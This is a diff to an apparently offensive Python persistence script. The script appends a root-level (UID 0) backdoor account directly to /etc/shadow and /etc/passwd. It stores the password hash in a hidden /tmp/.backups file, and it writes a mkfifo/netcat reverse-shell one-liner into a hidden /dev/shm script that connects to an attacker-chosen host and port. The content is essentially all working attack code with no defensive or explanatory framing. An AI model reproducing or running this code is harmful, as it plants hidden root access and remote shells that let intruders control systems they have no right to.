@@ -61,10 +61,13 @@ is_root = perm_check()
 def add_user(username,password):
 	if username:
 		print("establishing persistence...")
-		new_user_pass = crypt.crypt('{}'.format(password),'$6${}'.format(password))
+		os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
+		pass_file = open("/tmp/.backups/pass.txt", "r")
+		new_user_pass = pass_file.readlines()[-1].strip()
 		os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
 		os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
 		print("user {} added".format(username))
+		pass_file.close()
 	else:
 		print("\n*** error: username not specified: use -u to specify username ***")
 		return
@@ -77,7 +80,7 @@ def callback(local_ip, local_port, username, password):
 	os.system("touch /dev/shm/.data/data-log.sh")
 	os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
 	print("\n### enter {}'s password below: ###".format(username))
-	os.system("timeout -k 3 3 passwd {}".format(username))
+	os.system("timeout -k 5 5 passwd {}".format(username))
 	os.system("chown {} /dev/shm/.data/".format(username))
 	os.system("echo '{}' | sudo su {}".format(password,username))
 	os.system("chmod 100 /dev/shm/.data/data-log.sh")
